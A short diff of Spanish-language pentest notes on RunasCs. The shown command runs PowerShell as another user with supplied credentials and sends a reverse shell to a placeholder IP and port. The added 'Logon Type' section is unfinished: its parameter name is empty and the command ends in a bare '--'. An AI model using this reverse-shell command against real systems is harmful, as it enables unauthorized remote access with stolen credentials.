@@ -6,4 +6,10 @@ RunasCs es una herramienta que nos permite ejecutar ciertos procesos en el domin
 ./RunasCs.exe {usuario} {Password} "powershell.exe" -r {IP}:{PORT} 
 ```
 
+### Logon Type
 
+Para esto usamos el parametro ``
+
+```ruby
+./RunasCs.exe {usuario} {Password} "powershell.exe" -r {IP}:{PORT} --
+```
